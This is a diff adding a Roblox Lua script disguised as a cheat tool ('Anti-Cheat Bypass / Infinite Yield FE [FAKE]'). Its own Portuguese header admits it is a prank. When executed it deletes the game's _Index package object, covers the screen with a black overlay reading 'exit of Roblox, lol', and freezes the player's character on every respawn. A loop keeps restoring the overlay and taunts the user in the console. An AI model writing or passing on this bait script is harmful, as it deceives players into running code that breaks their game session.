@@ -1,0 +1,126 @@
+--[[
+    ATENÇÃO EXPLORADORES: Este script é uma trollagem. Não execute.
+    Script: Anti-Cheat Bypass / Infinite Yield FE [FAKE]
+    Função: Remove o _Index e trava a tela do usuário.
+]]
+
+-- ==========================================
+-- PARTE 1: Remover o _Index (O Isca)
+-- ==========================================
+local function removeIndex()
+    local targets = {"CorePackages", "Workspace"}
+    for _, serviceName in ipairs(targets) do
+        local success, service = pcall(function()
+            return game:GetService(serviceName)
+        end)
+        if not success or not service then
+            success, service = pcall(function()
+                return cloneref(game:GetService(serviceName))
+            end)
+        end
+        if success and service then
+            local packages = service:FindFirstChild("Packages")
+            local indexObj = packages and packages:FindFirstChild("_Index")
+            if indexObj then
+                indexObj:Destroy()
+            else
+                local recursiveIndex = service:FindFirstChild("_Index", true)
+                if recursiveIndex then
+                    recursiveIndex:Destroy()
+                end
+            end
+        end
+    end
+end
+removeIndex()
+
+-- ==========================================
+-- PARTE 2: A Trollagem (Tela Preta e Texto)
+-- ==========================================
+local function trollPlayer()
+    local player = game:GetService("Players").LocalPlayer
+    local coreGui = game:GetService("CoreGui")
+    
+    -- Tenta usar cloneref no CoreGui
+    local success, clonedCoreGui = pcall(function()
+        return cloneref(game:GetService("CoreGui"))
+    end)
+    if success and clonedCoreGui then
+        coreGui = clonedCoreGui
+    end
+
+    -- Função para criar a Interface
+    local function createUI()
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "ExitOverlay"
+        screenGui.IgnoreGuiInset = true
+        screenGui.ResetOnSpawn = false
+        screenGui.DisplayOrder = 999999
+
+        local blackFrame = Instance.new("Frame")
+        blackFrame.Size = UDim2.new(1, 0, 1, 0)
+        blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+        blackFrame.BorderSizePixel = 0
+        blackFrame.Parent = screenGui
+
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Size = UDim2.new(1, 0, 1, 0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = "exit of Roblox, lol"
+        textLabel.TextColor3 = Color3.new(1, 0, 0)
+        textLabel.TextScaled = true
+        textLabel.Font = Enum.Font.SourceSansBold
+        textLabel.Parent = blackFrame
+
+        -- Tenta colocar no CoreGui, se não, vai pro PlayerGui
+        pcall(function()
+            screenGui.Parent = coreGui
+        end)
+        
+        if not screenGui.Parent then
+            screenGui.Parent = player:WaitForChild("PlayerGui")
+        end
+    end
+
+    -- Cria a interface
+    createUI()
+
+    -- Trava o personagem da vítima
+    local function freezeCharacter(char)
+        local humanoid = char:WaitForChild("Humanoid", 5)
+        if humanoid then
+            humanoid.WalkSpeed = 0
+            humanoid.JumpPower = 0
+            humanoid.JumpHeight = 0
+            humanoid.Died:Connect(function()
+                task.wait(1)
+                freezeCharacter(player.Character or player.CharacterAdded:Wait())
+            end)
+        end
+    end
+
+    if player.Character then
+        freezeCharacter(player.Character)
+    end
+    player.CharacterAdded:Connect(freezeCharacter)
+
+    -- Loop para garantir que a interface não seja deletada
+    task.spawn(function()
+        while task.wait(0.5) do
+            local existingUI = coreGui:FindFirstChild("ExitOverlay") or player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("ExitOverlay")
+            if not existingUI then
+                createUI()
+                print("[Delta Script] Tentou fechar a tela preta? Tenta de novo, kkkk.")
+            end
+        end
+    end)
+
+    -- Aviso no console
+    warn("=======================================")
+    warn("VOCÊ FOI TROLLADO! KKKKKKKKKK")
+    warn("exit of Roblox, lol")
+    warn("=======================================")
+end
+
+-- Executa a trollagem
+trollPlayer()
